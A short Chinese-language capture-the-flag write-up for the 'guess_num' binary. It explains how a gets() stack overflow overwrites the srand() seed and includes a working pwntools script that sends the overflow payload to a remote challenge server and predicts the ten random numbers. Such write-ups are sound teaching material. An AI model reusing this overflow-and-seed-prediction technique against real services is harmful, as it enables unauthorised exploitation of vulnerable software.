第一步，使用IDA打开，使用F5插件打开，根据main函数，大致得出这是一个先调用srand()设置一个伪随机数种子，然后根据这个随机种子生成10个随机数，如果生成的随机数与输入的数字相同，则会调用sub_C3E()函数，成功拿到flag
第二步，发现危险函数gets函数，其参数是char v10，通过栈调用发现可以通过溢出的方式，覆盖srand()的参数seed。
第三步，这样我们就可以自己设置这个参数，再编程实现，使得输入的数字与guess_num程序生成的相同。在在线编辑器中编辑程序实现，生成伪随机数，与服务器交互比对。

1、Windows下和在Linux下生成的伪随机数是不一样的
2、具体实现：
(1). 通过垃圾字符覆盖var_30到seed：“a” * 0x20
(2). 使用p64()把1按照64位的方式进行排列产生随机数
(3). 调用srand()生成随机数
(4). 利用循环多次输入进行比较，直到相等。

# /use/bin/python3
# -*- comding:utf8 -*-  
from pwn import *
from ctypes import *
sh = remote('220.249.52.133',30956)
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

payload = 'A' * 32 + p64(1) 

sh.sendlineafter("name:",payload)
# get offset is 0x20,edit seed as 1 
libc.srand(1)
for i in range(10):        
    sh.recvuntil("number:")        
    sh.sendline(str(libc.rand()%6+1)) 
# print(str(libc.rand()%6+1)) 
sh.interactive()
